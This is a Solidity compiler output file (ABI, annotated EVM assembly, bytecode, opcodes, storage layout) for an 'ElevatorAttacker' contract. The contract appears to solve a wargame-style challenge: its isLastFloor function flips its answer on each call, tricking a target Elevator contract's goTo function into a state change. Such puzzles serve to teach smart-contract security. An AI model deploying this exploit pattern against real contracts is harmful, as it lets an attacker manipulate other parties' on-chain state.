{
	"contract/security/ElevatorAttacker.sol": {
		"Building": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "addr",
							"type": "address"
						}
					],
					"stateMutability": "payable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "flip",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"name": "isLastFloor",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contract/security/ElevatorAttacker.sol\":95:556  contract Building {\r... */\n  mstore(0x40, 0x80)\n    /* \"contract/security/ElevatorAttacker.sol\":171:284  constructor(address addr) public payable {\r... */\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contract/security/ElevatorAttacker.sol\":247:251  addr */\n  dup1\n    /* \"contract/security/ElevatorAttacker.sol\":223:235  elevatorImpl */\n  0x00\n  dup1\n    /* \"contract/security/ElevatorAttacker.sol\":223:252  elevatorImpl = Elevator(addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/ElevatorAttacker.sol\":271:276  false */\n  0x00\n    /* \"contract/security/ElevatorAttacker.sol\":263:268  isTop */\n  dup1\n  0x14\n    /* \"contract/security/ElevatorAttacker.sol\":263:276  isTop = false */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/ElevatorAttacker.sol\":171:284  constructor(address addr) public payable {\r... */\n  pop\n    /* \"contract/security/ElevatorAttacker.sol\":95:556  contract Building {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/ElevatorAttacker.sol\":95:556  contract Building {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5f9a4bca\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xcde4efa9\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contract/security/ElevatorAttacker.sol\":356:477  function isLastFloor(uint) public returns (bool){\r... */\n    tag_3:\n      tag_6\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_7\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_7:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_8\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contract/security/ElevatorAttacker.sol\":489:553  function attack() public {\r... */\n    tag_4:\n      tag_9\n      tag_10\n      jump\t// in\n    tag_9:\n      stop\n        /* \"contract/security/ElevatorAttacker.sol\":292:348  function flip() public {\r... */\n    tag_5:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"contract/security/ElevatorAttacker.sol\":356:477  function isLastFloor(uint) public returns (bool){\r... */\n    tag_8:\n        /* \"contract/security/ElevatorAttacker.sol\":399:403  bool */\n      0x00\n        /* \"contract/security/ElevatorAttacker.sol\":415:423  bool res */\n      dup1\n        /* \"contract/security/ElevatorAttacker.sol\":426:431  isTop */\n      0x00\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contract/security/ElevatorAttacker.sol\":415:431  bool res = isTop */\n      swap1\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":442:448  flip() */\n      tag_14\n        /* \"contract/security/ElevatorAttacker.sol\":442:446  flip */\n      tag_12\n        /* \"contract/security/ElevatorAttacker.sol\":442:448  flip() */\n      jump\t// in\n    tag_14:\n        /* \"contract/security/ElevatorAttacker.sol\":466:469  res */\n      dup1\n        /* \"contract/security/ElevatorAttacker.sol\":459:469  return res */\n      swap2\n      pop\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":356:477  function isLastFloor(uint) public returns (bool){\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contract/security/ElevatorAttacker.sol\":489:553  function attack() public {\r... */\n    tag_10:\n        /* \"contract/security/ElevatorAttacker.sol\":525:537  elevatorImpl */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/ElevatorAttacker.sol\":525:542  elevatorImpl.goTo */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xed9a7134\n        /* \"contract/security/ElevatorAttacker.sol\":543:544  1 */\n      0x01\n        /* \"contract/security/ElevatorAttacker.sol\":525:545  elevatorImpl.goTo(1) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":489:553  function attack() public {\r... */\n      jump\t// out\n        /* \"contract/security/ElevatorAttacker.sol\":292:348  function flip() public {\r... */\n    tag_12:\n        /* \"contract/security/ElevatorAttacker.sol\":335:340  isTop */\n      0x00\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contract/security/ElevatorAttacker.sol\":334:340  !isTop */\n      iszero\n        /* \"contract/security/ElevatorAttacker.sol\":326:331  isTop */\n      0x00\n      0x14\n        /* \"contract/security/ElevatorAttacker.sol\":326:340  isTop = !isTop */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contract/security/ElevatorAttacker.sol\":292:348  function flip() public {\r... */\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220eedfe33bcac3fa73984b0aa26629193dc564f1973011e0764fef2b3669c40f9164736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040526040516102553803806102558339818101604052602081101561002657600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008060146101000a81548160ff021916908315150217905550506101b4806100a16000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80635f9a4bca146100465780639e5faafc1461008a578063cde4efa914610094575b600080fd5b6100726004803603602081101561005c57600080fd5b810190808035906020019092919050505061009e565b60405180821515815260200191505060405180910390f35b6100926100c4565b005b61009c610152565b005b600080600060149054906101000a900460ff1690506100bb610152565b80915050919050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed9a713460016040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561013857600080fd5b505af115801561014c573d6000803e3d6000fd5b50505050565b600060149054906101000a900460ff1615600060146101000a81548160ff02191690831515021790555056fea2646970667358221220eedfe33bcac3fa73984b0aa26629193dc564f1973011e0764fef2b3669c40f9164736f6c634300060c0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x255 CODESIZE SUB DUP1 PUSH2 0x255 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x26 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP POP PUSH2 0x1B4 DUP1 PUSH2 0xA1 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5F9A4BCA EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x8A JUMPI DUP1 PUSH4 0xCDE4EFA9 EQ PUSH2 0x94 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x72 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x5C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x9E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x92 PUSH2 0xC4 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x9C PUSH2 0x152 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP PUSH2 0xBB PUSH2 0x152 JUMP JUMPDEST DUP1 SWAP2 POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xED9A7134 PUSH1 0x1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x138 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x14C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO PUSH1 0x0 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xEE 0xDF 0xE3 EXTCODESIZE 0xCA 0xC3 STATICCALL PUSH20 0x984B0AA26629193DC564F1973011E0764FEF2B36 PUSH10 0xC40F9164736F6C634300 MOD 0xC STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "87200",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"flip()": "21972",
						"isLastFloor(uint256)": "23013"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"flip()": "cde4efa9",
					"isLastFloor(uint256)": "5f9a4bca"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 9,
						"contract": "contract/security/ElevatorAttacker.sol:Building",
						"label": "elevatorImpl",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Elevator)7"
					},
					{
						"astId": 11,
						"contract": "contract/security/ElevatorAttacker.sol:Building",
						"label": "isTop",
						"offset": 20,
						"slot": "0",
						"type": "t_bool"
					}
				],
				"types": {
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(Elevator)7": {
						"encoding": "inplace",
						"label": "contract Elevator",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}